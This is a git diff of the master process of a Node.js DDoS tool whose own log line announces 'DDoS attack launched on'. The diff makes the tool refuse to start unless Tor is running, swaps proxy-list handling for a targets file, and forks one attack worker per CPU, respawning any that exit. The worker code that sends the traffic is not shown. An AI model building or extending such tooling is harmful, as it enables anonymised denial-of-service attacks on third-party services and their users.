@@ -4,8 +4,9 @@ import process from 'process';
 import { readFile } from 'fs/promises';
 import { resolve } from 'path';
 import { DATA_MSG, EXIT_MSG } from './constants.mjs';
+import { checkIfTorIsStartedOrExit } from "./utils.mjs";
 
-let configPath, dataPath, proxiesPath;
+let configPath, targetsPath;
 
 const startLogMessage = ['DDoS attack launched on', '        ' + new Date().toLocaleString()];
 const configMessages = [];
@@ -23,13 +24,8 @@ async function getConfig() {
 	return JSON.parse(await readFile(new URL(configPath, import.meta.url)));
 }
 
-async function getData() {
-	return JSON.parse(await readFile(new URL(dataPath, import.meta.url)));
-}
-
-async function getProxies() {
-	if (!proxiesPath) return;
-	return (await readFile(new URL(proxiesPath, import.meta.url))).toString();
+async function getTargets() {
+	return JSON.parse(await readFile(new URL(targetsPath, import.meta.url)));
 }
 
 function verifyUserConfig(userConfig) {
@@ -76,25 +72,24 @@ function aggregateWorkersStats(workerData) {
 }
 
 export async function startMaster() {
+	await checkIfTorIsStartedOrExit();
+
 	const argv = process.argv.splice(2, 3);
 
 	if (!argv.length) {
-		throw new Error('Missing arguments path to data.json and config.json');
+		throw new Error('Missing arguments path to targets.json and config.json');
 	}
 
-	proxiesPath = argv.length === 3 && resolve(process.cwd(), argv.pop());
 	configPath = resolve(process.cwd(), argv.pop());
-	dataPath = resolve(process.cwd(), argv.pop());
+	targetsPath = resolve(process.cwd(), argv.pop());
 
-	console.info('using data from path', dataPath);
+	console.info('using targets from path', targetsPath);
 	console.info('using config from path', configPath);
-	console.info('using proxies from path', proxiesPath);
 
 	const numCPUs = cpus().length;
 
-	const { data } = await getData();
+	const { data } = await getTargets();
 	const userConfig = await getConfig();
-	const proxies = await getProxies() ?? {};
 	verifyUserConfig(userConfig);
 
 	const preparedUserConfig = {
@@ -107,8 +102,7 @@ export async function startMaster() {
 	for (let i = 0; i < numCPUs; ++i) {
 		cluster.fork({
 			USER_CONFIG: JSON.stringify(preparedUserConfig),
-			DATA: JSON.stringify(data),
-			PROXIES: JSON.stringify(proxies),
+			TARGETS: JSON.stringify(data),
 			CONFIG_MESSAGE: JSON.stringify(configMessages)
 		});
 	}
@@ -122,8 +116,7 @@ export async function startMaster() {
 	cluster.on('exit', () => {
 		cluster.fork({
 			USER_CONFIG: JSON.stringify(preparedUserConfig),
-			DATA: JSON.stringify(data),
-			PROXIES: proxies,
+			TARGETS: JSON.stringify(data),
 			CONFIG_MESSAGE: JSON.stringify(configMessages)
 		});
 	});
